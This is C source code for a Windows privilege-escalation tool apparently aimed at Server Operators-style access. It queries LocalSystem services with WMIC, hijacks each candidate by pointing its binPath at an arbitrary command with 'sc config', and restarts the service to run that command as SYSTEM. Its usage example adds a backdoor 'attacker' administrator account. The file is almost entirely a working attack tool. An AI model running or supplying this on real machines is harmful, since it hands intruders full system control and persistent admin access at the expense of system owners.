#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#ifdef _WIN32
#include <windows.h> // For Sleep()
#endif

#define MAX_LINE_LEN 1024
#define MAX_NAME_LEN 256
#define MAX_PATH_LEN 1024

//Compile Instructions
// x86_64-w64-mingw32-gcc -o ServerOperators.exe ServerOperators.c
// Helper function to extract value from "Key=Value" format.
// It modifies the input line by replacing the newline with a null terminator.
// Returns a pointer to the value part of the string, or NULL if the key doesn't match.
static char* get_value_from_key_equals_value(char* line, const char* key) {
    // Remove trailing newline characters which can be \r\n or \n
    line[strcspn(line, "\r\n")] = 0;

    size_t key_len = strlen(key);
    if (strncmp(line, key, key_len) == 0 && line[key_len] == '=') {
        return line + key_len + 1;
    }
    return NULL;
}

// A helper function to execute a system command and print its status.
// Returns the exit code of the command.
static int execute_command(const char* cmd) {
    printf(" > Executing: %s\n", cmd);
    int result = system(cmd);
    if (result != 0) {
        fprintf(stderr, "   [!] Command finished with non-zero exit code: %d\n", result);
    } else {
        printf("   [+] Command finished successfully.\n");
    }
    return result;
}

int main(int argc, char *argv[]) {
    FILE *pipe_wmic;
    char line[MAX_LINE_LEN];
    // WMIC is more efficient as it runs a single command to get all required info.
    // It filters for services where StartName is 'LocalSystem' and gets the Name and PathName.
    // We also filter out services marked as 'Critical' for ErrorControl and low-level drivers
    // to focus on non-essential user-mode services.
    // The /format:list provides an easy-to-parse key=value output.
    const char *wmic_cmd = "wmic service where \""
        "StartName='LocalSystem' AND ErrorControl<>'Critical' AND ServiceType<>'Kernel Driver' AND ServiceType<>'File System Driver' "
        "AND Name<>'RpcSs' AND Name<>'Dhcp' AND Name<>'Dnscache' AND Name<>'Winmgmt' "
        "AND Name<>'EventLog' AND Name<>'ProfSvc' AND Name<>'SamSs' AND Name<>'Netlogon' "
        "AND Name<>'LanmanWorkstation' AND Name<>'LanmanServer' AND Name<>'BFE' AND Name<>'CryptSvc'"
        "\" get Name,PathName /format:list";

    if (argc < 2) {
        fprintf(stderr, "This tool attempts to find a vulnerable service to escalate privileges.\n");
        fprintf(stderr, "It modifies service configurations and is inherently DANGEROUS.\n");
        fprintf(stderr, "Use with extreme caution on systems you are authorized to test.\n\n");
        fprintf(stderr, "Usage: %s \"<command to execute>\"\n", argv[0]);
        fprintf(stderr, "Example: %s \"net user attacker P@ssw0rd123 /add && net localgroup administrators attacker /add\"\n", argv[0]);
        return 1;
    }

    const char *user_command = argv[1];


    // On non-Windows systems, popen is standard. On Windows, _popen is used.
    // The command itself is Windows-specific, so this is for compilation consistency.
#ifdef _WIN32
    pipe_wmic = _popen(wmic_cmd, "r");
#else
    pipe_wmic = popen(wmic_cmd, "r");
#endif

    if (!pipe_wmic) {
        perror("Failed to run wmic command");
        return 1;
    }

    printf("Searching for potential services to hijack...\n");
    printf("Payload to execute: %s\n\n", user_command);

    char service_name[MAX_NAME_LEN] = {0};
    char bin_path[MAX_PATH_LEN] = {0};

    // Read the output of the wmic command line by line
    while (fgets(line, sizeof(line), pipe_wmic)) {
        char* val;
        if ((val = get_value_from_key_equals_value(line, "Name"))) {
            strncpy(service_name, val, sizeof(service_name) - 1);
        } else if ((val = get_value_from_key_equals_value(line, "PathName"))) {
            strncpy(bin_path, val, sizeof(bin_path) - 1);
        }

        // An empty line (or a line with just \r\n) signifies the end of a record.
        if (strlen(line) == 0) {
            if (strlen(service_name) > 0 && strlen(bin_path) > 0) {
                printf("\n[*] Found candidate service: %s\n", service_name);
                printf("    Original binPath: %s\n", bin_path);

                // 1. Modify the service binPath to our payload
                printf("[*] Attempting to hijack service...\n");
                char cmd_buffer[MAX_PATH_LEN * 2];
                snprintf(cmd_buffer, sizeof(cmd_buffer), "sc config \"%s\" binPath= \"%s\"", service_name, user_command);
                if (execute_command(cmd_buffer) != 0) {
                    fprintf(stderr, "[!] Failed to modify binPath for '%s'. You may lack permissions. Trying next service...\n", service_name);
                    service_name[0] = '\0';
                    bin_path[0] = '\0';
                    continue;
                }

                // 2. Stop the service (ignore errors if it's already stopped)
                snprintf(cmd_buffer, sizeof(cmd_buffer), "net stop \"%s\"", service_name);
                printf(" > Executing: %s\n", cmd_buffer);
                system(cmd_buffer); // We don't care if this fails (e.g., already stopped).
                printf("   [*] Assuming service is stopped.\n");
                #ifdef _WIN32
                Sleep(2500); // Give the service a moment to fully stop
                #endif

                // 3. Start the service to execute our payload
                printf("[*] Starting service to execute payload...\n");
                snprintf(cmd_buffer, sizeof(cmd_buffer), "net start \"%s\"", service_name);
                int start_result = execute_command(cmd_buffer);

                // 4. CRITICAL: Restore the original binPath to clean up
                printf("[*] Restoring original binPath for %s...\n", service_name);
                snprintf(cmd_buffer, sizeof(cmd_buffer), "sc config \"%s\" binPath= \"%s\"", service_name, bin_path);
                if (execute_command(cmd_buffer) != 0) {
                    fprintf(stderr, "\n[!!!] CRITICAL FAILURE: Could not restore original binPath for %s.\n", service_name);
                    fprintf(stderr, "    The service is now in a broken state. Manual repair required:\n");
                    fprintf(stderr, "    > sc config \"%s\" binPath= \"%s\"\n", service_name, bin_path);
                }

                // 5. Check if we succeeded and exit
                if (start_result == 0) {
                    printf("\n[+] SUCCESS: Payload likely executed via service '%s'. Exiting.\n", service_name);
                    _pclose(pipe_wmic);
                    return 0; // Success, we are done
                } else {
                    fprintf(stderr, "\n[-] FAILED: Could not start service '%s' with payload.\n", service_name);

                    printf("    Continue to next service? (y/n): ");
                    int user_choice = getchar();
                    // Clear the input buffer in case user enters more than one character
                    int c;
                    while ((c = getchar()) != '\n' && c != EOF);

                    if (user_choice != 'y' && user_choice != 'Y') {
                        printf("    Aborting search.\n");
                        goto end_loop;
                    }
                    fprintf(stderr, "    Trying next service...\n");
                }

                // Reset for the next record
                service_name[0] = '\0';
                bin_path[0] = '\0';
            }
        }
    }
end_loop:
#ifdef _WIN32
    _pclose(pipe_wmic);
#else
    pclose(pipe_wmic);
#endif

    printf("\n[-] Exhausted all potential services. No vulnerable service found or payload failed to execute.\n");
    return 0;
}
